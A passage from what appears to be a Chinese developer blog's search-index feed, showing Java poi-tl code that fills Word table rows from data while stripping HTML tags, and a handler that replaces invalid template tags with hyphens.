punctuation">.</span>poi<span class="token punctuation">.</span>template<span class="token punctuation">.</span>ElementTemplate<span class="token punctuation">;</span><span class="token keyword">import</span> com<span class="token punctuation">.</span>deepoove<span class="token punctuation">.</span>poi<span class="token punctuation">.</span>template<span class="token punctuation">.</span>MetaTemplate<span class="token punctuation">;</span><span class="token keyword">import</span> com<span class="token punctuation">.</span>deepoove<span class="token punctuation">.</span>poi<span class="token punctuation">.</span>template<span class="token punctuation">.</span>run<span class="token punctuation">.</span>RunTemplate<span class="token punctuation">;</span><span class="token keyword">import</span> com<span class="token punctuation">.</span>deepoove<span class="token punctuation">.</span>poi<span class="token punctuation">.</span>util<span class="token punctuation">.</span>ReflectionUtils<span class="token punctuation">;</span><span class="token keyword">import</span> com<span class="token punctuation">.</span>deepoove<span class="token punctuation">.</span>poi<span class="token punctuation">.</span>util<span class="token punctuation">.</span>TableTools<span class="token punctuation">;</span><span class="token keyword">import</span> org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>poi<span class="token punctuation">.</span>xwpf<span class="token punctuation">.</span>usermodel<span class="token punctuation">.</span>*<span class="token punctuation">;</span><span class="token keyword">import</span> org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>xmlbeans<span class="token punctuation">.</span>XmlCursor<span class="token punctuation">;</span><span class="token keyword">import</span> org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>xmlbeans<span class="token punctuation">.</span>XmlObject<span class="token punctuation">;</span><span class="token keyword">import</span> org<span class="token punctuation">.</span>openxmlformats<span class="token punctuation">.</span>schemas<span class="token punctuation">.</span>wordprocessingml<span class="token punctuation">.</span>x2006<span class="token punctuation">.</span>main<span class="token punctuation">.</span>*<span class="token punctuation">;</span><span class="token keyword">import</span> java<span class="token punctuation">.</span>util<span class="token punctuation">.</span>Iterator<span class="token punctuation">;</span><span class="token keyword">import</span> java<span class="token punctuation">.</span>util<span class="token punctuation">.</span>List<span class="token punctuation">;</span><span class="token keyword">import</span> java<span class="token punctuation">.</span>util<span class="token punctuation">.</span>Map<span class="token punctuation">;</span><span class="token keyword">import</span> java<span class="token punctuation">.</span>util<span class="token punctuation">.</span>Set<span class="token punctuation">;</span><span class="token comment" spellcheck="true">/** * 在Word文档中的表格中循环插入数据 * @Author: CZM */</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">HackLoopTableHtmlTextRenderPolicy</span>  <span class="token keyword">implements</span> <span class="token class-name">RenderPolicy</span> <span class="token punctuation">{</span>    <span class="token keyword">private</span> String prefix<span class="token punctuation">;</span>    <span class="token keyword">private</span> String suffix<span class="token punctuation">;</span>    <span class="token keyword">private</span> <span class="token keyword">boolean</span> onSameLine<span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token function">HackLoopTableHtmlTextRenderPolicy</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">this</span><span class="token punctuation">(</span><span class="token boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token function">HackLoopTableHtmlTextRenderPolicy</span><span class="token punctuation">(</span><span class="token keyword">boolean</span> onSameLine<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">this</span><span class="token punctuation">(</span><span class="token string">"["</span><span class="token punctuation">,</span> <span class="token string">"]"</span><span class="token punctuation">,</span> onSameLine<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token function">HackLoopTableHtmlTextRenderPolicy</span><span class="token punctuation">(</span>String prefix<span class="token punctuation">,</span> String suffix<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">this</span><span class="token punctuation">(</span>prefix<span class="token punctuation">,</span> suffix<span class="token punctuation">,</span> <span class="token boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token function">HackLoopTableHtmlTextRenderPolicy</span><span class="token punctuation">(</span>String prefix<span class="token punctuation">,</span> String suffix<span class="token punctuation">,</span> <span class="token keyword">boolean</span> onSameLine<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">this</span><span class="token punctuation">.</span>prefix <span class="token operator">=</span> prefix<span class="token punctuation">;</span>        <span class="token keyword">this</span><span class="token punctuation">.</span>suffix <span class="token operator">=</span> suffix<span class="token punctuation">;</span>        <span class="token keyword">this</span><span class="token punctuation">.</span>onSameLine <span class="token operator">=</span> onSameLine<span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token annotation punctuation">@Override</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">render</span><span class="token punctuation">(</span>ElementTemplate eleTemplate<span class="token punctuation">,</span> Object data<span class="token punctuation">,</span> XWPFTemplate template<span class="token punctuation">)</span> <span class="token punctuation">{</span>        RunTemplate runTemplate <span class="token operator">=</span> <span class="token punctuation">(</span>RunTemplate<span class="token punctuation">)</span> eleTemplate<span class="token punctuation">;</span>        XWPFRun run <span class="token operator">=</span> runTemplate<span class="token punctuation">.</span><span class="token function">getRun</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">try</span> <span class="token punctuation">{</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>TableTools<span class="token punctuation">.</span><span class="token function">isInsideTable</span><span class="token punctuation">(</span>run<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">IllegalStateException</span><span class="token punctuation">(</span>                        <span class="token string">"The template tag "</span> <span class="token operator">+</span> runTemplate<span class="token punctuation">.</span><span class="token function">getSource</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">" must be inside a table"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>            XWPFTableCell tagCell <span class="token operator">=</span> <span class="token punctuation">(</span>XWPFTableCell<span class="token punctuation">)</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>XWPFParagraph<span class="token punctuation">)</span> run<span class="token punctuation">.</span><span class="token function">getParent</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getBody</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            XWPFTable table <span class="token operator">=</span> tagCell<span class="token punctuation">.</span><span class="token function">getTableRow</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getTable</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            run<span class="token punctuation">.</span><span class="token function">setText</span><span class="token punctuation">(</span><span class="token string">""</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            CTFonts font <span class="token operator">=</span> run<span class="token punctuation">.</span><span class="token function">getCTR</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">addNewRPr</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">addNewRFonts</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            font<span class="token punctuation">.</span><span class="token function">setEastAsia</span><span class="token punctuation">(</span><span class="token string">"黑体"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            font<span class="token punctuation">.</span><span class="token function">setAscii</span><span class="token punctuation">(</span><span class="token string">"仿宋"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">int</span> templateRowIndex <span class="token operator">=</span> <span class="token function">getTemplateRowIndex</span><span class="token punctuation">(</span>tagCell<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span>null <span class="token operator">!=</span> data <span class="token operator">&amp;&amp;</span> data <span class="token keyword">instanceof</span> <span class="token class-name">Iterable</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                Iterator<span class="token operator">&lt;</span><span class="token operator">?</span><span class="token operator">></span> iterator <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>Iterable<span class="token operator">&lt;</span><span class="token operator">?</span><span class="token operator">></span><span class="token punctuation">)</span> data<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">iterator</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                XWPFTableRow templateRow <span class="token operator">=</span> table<span class="token punctuation">.</span><span class="token function">getRow</span><span class="token punctuation">(</span>templateRowIndex<span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token keyword">int</span> insertPosition <span class="token operator">=</span> templateRowIndex<span class="token punctuation">;</span>                TemplateResolver resolver <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">TemplateResolver</span><span class="token punctuation">(</span>template<span class="token punctuation">.</span><span class="token function">getConfig</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">copy</span><span class="token punctuation">(</span>prefix<span class="token punctuation">,</span> suffix<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token keyword">boolean</span> firstFlag <span class="token operator">=</span> <span class="token boolean">true</span><span class="token punctuation">;</span>                <span class="token keyword">while</span> <span class="token punctuation">(</span>iterator<span class="token punctuation">.</span><span class="token function">hasNext</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                    insertPosition <span class="token operator">=</span> templateRowIndex<span class="token operator">++</span><span class="token punctuation">;</span>                    XWPFTableRow nextRow <span class="token operator">=</span> table<span class="token punctuation">.</span><span class="token function">insertNewTableRow</span><span class="token punctuation">(</span>insertPosition<span class="token punctuation">)</span><span class="token punctuation">;</span>                    <span class="token function">setTableRow</span><span class="token punctuation">(</span>table<span class="token punctuation">,</span> templateRow<span class="token punctuation">,</span> insertPosition<span class="token punctuation">)</span><span class="token punctuation">;</span>                    <span class="token comment" spellcheck="true">// double set row</span>                    XmlCursor newCursor <span class="token operator">=</span> templateRow<span class="token punctuation">.</span><span class="token function">getCtRow</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">newCursor</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                    newCursor<span class="token punctuation">.</span><span class="token function">toPrevSibling</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                    XmlObject object <span class="token operator">=</span> newCursor<span class="token punctuation">.</span><span class="token function">getObject</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                    nextRow <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">XWPFTableRow</span><span class="token punctuation">(</span><span class="token punctuation">(</span>CTRow<span class="token punctuation">)</span> object<span class="token punctuation">,</span> table<span class="token punctuation">)</span><span class="token punctuation">;</span>                    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>firstFlag<span class="token punctuation">)</span> <span class="token punctuation">{</span>                        <span class="token comment" spellcheck="true">// update VMerge cells for non-first row</span>                        List<span class="token operator">&lt;</span>XWPFTableCell<span class="token operator">></span> tableCells <span class="token operator">=</span> nextRow<span class="token punctuation">.</span><span class="token function">getTableCells</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                        <span class="token keyword">for</span> <span class="token punctuation">(</span>XWPFTableCell cell <span class="token operator">:</span> tableCells<span class="token punctuation">)</span> <span class="token punctuation">{</span>                            CTTcPr tcPr <span class="token operator">=</span> TableTools<span class="token punctuation">.</span><span class="token function">getTcPr</span><span class="token punctuation">(</span>cell<span class="token punctuation">)</span><span class="token punctuation">;</span>                            CTVMerge vMerge <span class="token operator">=</span> tcPr<span class="token punctuation">.</span><span class="token function">getVMerge</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                            <span class="token keyword">if</span> <span class="token punctuation">(</span>null <span class="token operator">==</span> vMerge<span class="token punctuation">)</span> <span class="token keyword">continue</span><span class="token punctuation">;</span>                            <span class="token keyword">if</span> <span class="token punctuation">(</span>STMerge<span class="token punctuation">.</span>RESTART <span class="token operator">==</span> vMerge<span class="token punctuation">.</span><span class="token function">getVal</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                                vMerge<span class="token punctuation">.</span><span class="token function">setVal</span><span class="token punctuation">(</span>STMerge<span class="token punctuation">.</span>CONTINUE<span class="token punctuation">)</span><span class="token punctuation">;</span>                            <span class="token punctuation">}</span>                        <span class="token punctuation">}</span>                    <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>                        firstFlag <span class="token operator">=</span> <span class="token boolean">false</span><span class="token punctuation">;</span>                    <span class="token punctuation">}</span>                    <span class="token function">setTableRow</span><span class="token punctuation">(</span>table<span class="token punctuation">,</span> nextRow<span class="token punctuation">,</span> insertPosition<span class="token punctuation">)</span><span class="token punctuation">;</span>                    Object next <span class="token operator">=</span> iterator<span class="token punctuation">.</span><span class="token function">next</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                    RenderDataCompute dataCompute<span class="token punctuation">;</span>                    <span class="token keyword">if</span> <span class="token punctuation">(</span>ObjectUtil<span class="token punctuation">.</span><span class="token function">isNotNull</span><span class="token punctuation">(</span>next<span class="token punctuation">)</span><span class="token operator">&amp;&amp;</span>next <span class="token keyword">instanceof</span> <span class="token class-name">JSONObject</span><span class="token punctuation">)</span><span class="token punctuation">{</span>                        JSONObject pendingData <span class="token operator">=</span> <span class="token punctuation">(</span>JSONObject<span class="token punctuation">)</span> next<span class="token punctuation">;</span>                        Set<span class="token operator">&lt;</span>String<span class="token operator">></span> keySet <span class="token operator">=</span> pendingData<span class="token punctuation">.</span><span class="token function">keySet</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                        keySet<span class="token punctuation">.</span><span class="token function">forEach</span><span class="token punctuation">(</span>x<span class="token operator">-</span><span class="token operator">></span><span class="token punctuation">{</span>                            <span class="token keyword">if</span> <span class="token punctuation">(</span>StrUtil<span class="token punctuation">.</span><span class="token function">isNotBlank</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>                                pendingData<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span>x<span class="token punctuation">,</span> HtmlUtil<span class="token punctuation">.</span><span class="token function">cleanHtmlTag</span><span class="token punctuation">(</span>pendingData<span class="token punctuation">.</span><span class="token function">getString</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                            <span class="token punctuation">}</span>                        <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                        dataCompute <span class="token operator">=</span> template<span class="token punctuation">.</span><span class="token function">getConfig</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getRenderDataComputeFactory</span><span class="token punctuation">(</span><span class="token punctuation">)</span>                                <span class="token punctuation">.</span><span class="token function">newCompute</span><span class="token punctuation">(</span>pendingData<span class="token punctuation">)</span><span class="token punctuation">;</span>                    <span class="token punctuation">}</span><span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>ObjectUtil<span class="token punctuation">.</span><span class="token function">isNotNull</span><span class="token punctuation">(</span>next<span class="token punctuation">)</span><span class="token operator">&amp;&amp;</span>next <span class="token keyword">instanceof</span> <span class="token class-name">Map</span><span class="token punctuation">)</span><span class="token punctuation">{</span>                        Map map <span class="token operator">=</span> <span class="token punctuation">(</span>Map<span class="token punctuation">)</span> next<span class="token punctuation">;</span>                        Set keySet <span class="token operator">=</span> map<span class="token punctuation">.</span><span class="token function">keySet</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                        keySet<span class="token punctuation">.</span><span class="token function">forEach</span><span class="token punctuation">(</span>x<span class="token operator">-</span><span class="token operator">></span><span class="token punctuation">{</span>                            <span class="token keyword">if</span> <span class="token punctuation">(</span>ObjectUtil<span class="token punctuation">.</span><span class="token function">isNotNull</span><span class="token punctuation">(</span>map<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>                                map<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span>x<span class="token punctuation">,</span>HtmlUtil<span class="token punctuation">.</span><span class="token function">cleanHtmlTag</span><span class="token punctuation">(</span>map<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                            <span class="token punctuation">}</span><span class="token keyword">else</span> <span class="token punctuation">{</span>                                map<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span>x<span class="token punctuation">,</span>map<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                            <span class="token punctuation">}</span>                        <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                        dataCompute <span class="token operator">=</span> template<span class="token punctuation">.</span><span class="token function">getConfig</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getRenderDataComputeFactory</span><span class="token punctuation">(</span><span class="token punctuation">)</span>                                <span class="token punctuation">.</span><span class="token function">newCompute</span><span class="token punctuation">(</span>map<span class="token punctuation">)</span><span class="token punctuation">;</span>                    <span class="token punctuation">}</span><span class="token keyword">else</span> <span class="token punctuation">{</span>                        dataCompute <span class="token operator">=</span> template<span class="token punctuation">.</span><span class="token function">getConfig</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getRenderDataComputeFactory</span><span class="token punctuation">(</span><span class="token punctuation">)</span>                                <span class="token punctuation">.</span><span class="token function">newCompute</span><span class="token punctuation">(</span>next<span class="token punctuation">)</span><span class="token punctuation">;</span>                    <span class="token punctuation">}</span>                    List<span class="token operator">&lt;</span>XWPFTableCell<span class="token operator">></span> cells <span class="token operator">=</span> nextRow<span class="token punctuation">.</span><span class="token function">getTableCells</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                    cells<span class="token punctuation">.</span><span class="token function">forEach</span><span class="token punctuation">(</span>cell <span class="token operator">-</span><span class="token operator">></span> <span class="token punctuation">{</span>                        List<span class="token operator">&lt;</span>MetaTemplate<span class="token operator">></span> templates <span class="token operator">=</span> resolver<span class="token punctuation">.</span><span class="token function">resolveBodyElements</span><span class="token punctuation">(</span>cell<span class="token punctuation">.</span><span class="token function">getBodyElements</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                        <span class="token keyword">new</span> <span class="token class-name">DocumentProcessor</span><span class="token punctuation">(</span>template<span class="token punctuation">,</span> resolver<span class="token punctuation">,</span> dataCompute<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">process</span><span class="token punctuation">(</span>templates<span class="token punctuation">)</span><span class="token punctuation">;</span>                    <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token punctuation">}</span>            <span class="token punctuation">}</span>            table<span class="token punctuation">.</span><span class="token function">removeRow</span><span class="token punctuation">(</span>templateRowIndex<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token function">afterloop</span><span class="token punctuation">(</span>table<span class="token punctuation">,</span> data<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">Exception</span> e<span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">RenderException</span><span class="token punctuation">(</span><span class="token string">"HackLoopTable for "</span> <span class="token operator">+</span> eleTemplate <span class="token operator">+</span> <span class="token string">"error: "</span> <span class="token operator">+</span> e<span class="token punctuation">.</span><span class="token function">getMessage</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> e<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token keyword">private</span> <span class="token keyword">int</span> <span class="token function">getTemplateRowIndex</span><span class="token punctuation">(</span>XWPFTableCell tagCell<span class="token punctuation">)</span> <span class="token punctuation">{</span>        XWPFTableRow tagRow <span class="token operator">=</span> tagCell<span class="token punctuation">.</span><span class="token function">getTableRow</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> onSameLine <span class="token operator">?</span> <span class="token function">getRowIndex</span><span class="token punctuation">(</span>tagRow<span class="token punctuation">)</span> <span class="token operator">:</span> <span class="token punctuation">(</span><span class="token function">getRowIndex</span><span class="token punctuation">(</span>tagRow<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">protected</span> <span class="token keyword">void</span> <span class="token function">afterloop</span><span class="token punctuation">(</span>XWPFTable table<span class="token punctuation">,</span> Object data<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token punctuation">}</span>    <span class="token annotation punctuation">@SuppressWarnings</span><span class="token punctuation">(</span><span class="token string">"unchecked"</span><span class="token punctuation">)</span>    <span class="token keyword">private</span> <span class="token keyword">void</span> <span class="token function">setTableRow</span><span class="token punctuation">(</span>XWPFTable table<span class="token punctuation">,</span> XWPFTableRow templateRow<span class="token punctuation">,</span> <span class="token keyword">int</span> pos<span class="token punctuation">)</span> <span class="token punctuation">{</span>        List<span class="token operator">&lt;</span>XWPFTableRow<span class="token operator">></span> rows <span class="token operator">=</span> <span class="token punctuation">(</span>List<span class="token operator">&lt;</span>XWPFTableRow<span class="token operator">></span><span class="token punctuation">)</span> ReflectionUtils<span class="token punctuation">.</span><span class="token function">getValue</span><span class="token punctuation">(</span><span class="token string">"tableRows"</span><span class="token punctuation">,</span> table<span class="token punctuation">)</span><span class="token punctuation">;</span>        rows<span class="token punctuation">.</span><span class="token function">set</span><span class="token punctuation">(</span>pos<span class="token punctuation">,</span> templateRow<span class="token punctuation">)</span><span class="token punctuation">;</span>        table<span class="token punctuation">.</span><span class="token function">getCTTbl</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">setTrArray</span><span class="token punctuation">(</span>pos<span class="token punctuation">,</span> templateRow<span class="token punctuation">.</span><span class="token function">getCtRow</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">private</span> <span class="token keyword">int</span> <span class="token function">getRowIndex</span><span class="token punctuation">(</span>XWPFTableRow row<span class="token punctuation">)</span> <span class="token punctuation">{</span>        List<span class="token operator">&lt;</span>XWPFTableRow<span class="token operator">></span> rows <span class="token operator">=</span> row<span class="token punctuation">.</span><span class="token function">getTable</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getRows</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> rows<span class="token punctuation">.</span><span class="token function">indexOf</span><span class="token punctuation">(</span>row<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><h3 id="处理文档中的连字符错误"><a href="#处理文档中的连字符错误" class="headerlink" title="处理文档中的连字符错误"></a>处理文档中的连字符错误</h3><pre class=" language-java"><code class="language-java"><span class="token keyword">import</span> com<span class="token punctuation">.</span>deepoove<span class="token punctuation">.</span>poi<span class="token punctuation">.</span>config<span class="token punctuation">.</span>Configure<span class="token punctuation">;</span><span class="token keyword">import</span> com<span class="token punctuation">.</span>deepoove<span class="token punctuation">.</span>poi<span class="token punctuation">.</span>render<span class="token punctuation">.</span>RenderContext<span class="token punctuation">;</span><span class="token keyword">import</span> com<span class="token punctuation">.</span>deepoove<span class="token punctuation">.</span>poi<span class="token punctuation">.</span>util<span class="token punctuation">.</span>ParagraphUtils<span class="token punctuation">;</span><span class="token keyword">import</span> com<span class="token punctuation">.</span>deepoove<span class="token punctuation">.</span>poi<span class="token punctuation">.</span>xwpf<span class="token punctuation">.</span>BodyContainer<span class="token punctuation">;</span><span class="token keyword">import</span> com<span class="token punctuation">.</span>deepoove<span class="token punctuation">.</span>poi<span class="token punctuation">.</span>xwpf<span class="token punctuation">.</span>BodyContainerFactory<span class="token punctuation">;</span><span class="token keyword">import</span> org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>poi<span class="token punctuation">.</span>xwpf<span class="token punctuation">.</span>usermodel<span class="token punctuation">.</span>IRunBody<span class="token punctuation">;</span><span class="token keyword">import</span> org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>poi<span class="token punctuation">.</span>xwpf<span class="token punctuation">.</span>usermodel<span class="token punctuation">.</span>XWPFParagraph<span class="token punctuation">;</span><span class="token keyword">import</span> org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>poi<span class="token punctuation">.</span>xwpf<span class="token punctuation">.</span>usermodel<span class="token punctuation">.</span>XWPFRun<span class="token punctuation">;</span><span class="token comment" spellcheck="true">/** * 处理文档中的连字符错误 * @Author: CZM */</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">HyphenHandler</span> <span class="token keyword">implements</span> <span class="token class-name">Configure<span class="token punctuation">.</span>ValidErrorHandler</span> <span class="token punctuation">{</span>    <span class="token annotation punctuation">@Override</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">handler</span><span class="token punctuation">(</span>RenderContext<span class="token operator">&lt;</span><span class="token operator">?</span><span class="token operator">></span> context<span class="token punctuation">)</span> <span class="token punctuation">{</span>        XWPFRun run <span class="token operator">=</span> context<span class="token punctuation">.</span><span class="token function">getRun</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        BodyContainer bodyContainer <span class="token operator">=</span> BodyContainerFactory<span class="token punctuation">.</span><span class="token function">getBodyContainer</span><span class="token punctuation">(</span>run<span class="token punctuation">)</span><span class="token punctuation">;</span>        IRunBody parent <span class="token operator">=</span> run<span class="token punctuation">.</span><span class="token function">getParent</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        run<span class="token punctuation">.</span><span class="token function">setText</span><span class="token punctuation">(</span><span class="token string">"-"</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>parent <span class="token keyword">instanceof</span> <span class="token class-name">XWPFParagraph</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            String paragraphText <span class="token operator">=</span> ParagraphUtils<span class="token punctuation">.</span><span class="token function">trimLine</span><span class="token punctuation">(</span><span class="token punctuation">(</span>XWPFParagraph<span class="token punctuation">)</span> parent<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">boolean</span> havePictures                    <span class="token operator">=</span> ParagraphUtils<span class="token punctuation">.</span><span class="token function">havePictures</span><span class="token punctuation">(</span><span class="token punctuation">(</span>XWPFParagraph<span class="token punctuation">)</span> parent<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">boolean</span> havePageBreak <span class="token operator">=</span> ParagraphUtils<span class="token punctuation">.</span><span class="token function">havePageBreak</span><span class="token punctuation">(</span><span class="token punctuation">(</span>XWPFParagraph<span class="token punctuation">)</span> parent<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">boolean</span> have0bject <span class="token operator">=</span> ParagraphUtils<span class="token punctuation">.</span><span class="token function">haveObject</span><span class="token punctuation">(</span><span class="token punctuation">(</span>XWPFParagraph<span class="token punctuation">)</span> parent<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token string">""</span><span class="token punctuation">.</span><span class="token function">equals</span><span class="token punctuation">(</span>paragraphText<span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token operator">!</span>havePictures <span class="token operator">&amp;&amp;</span> <span class="token operator">!</span>havePageBreak <span class="token operator">&amp;&amp;</span> <span class="token operator">!</span>have0bject<span class="token punctuation">)</span> <span class="token punctuation">{</span>                <span class="token keyword">int</span> pos <span class="token operator">=</span> bodyContainer<span class="token punctuation">.</span><span class="token function">getPosOfParagraph</span><span class="token punctuation">(</span><span class="token punctuation">(</span>XWPFParagraph<span class="token punctuation">)</span> parent<span class="token punctuation">)</span><span class="token punctuation">;</span>                bodyContainer<span class="token punctuation">.</span><span class="token function">removeBodyElement</span><span class="token punctuation">(</span>pos<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre>]]></content>
      
      
      <categories>
          
          <category> Word </category>
          
          <category> PDF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Word操作 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Word转PDF</title>
      <link href="/2022/06/01/word-zhuan-pdf/"/>
      <url>/2022/06/01/word-zhuan-pdf/</url>
      
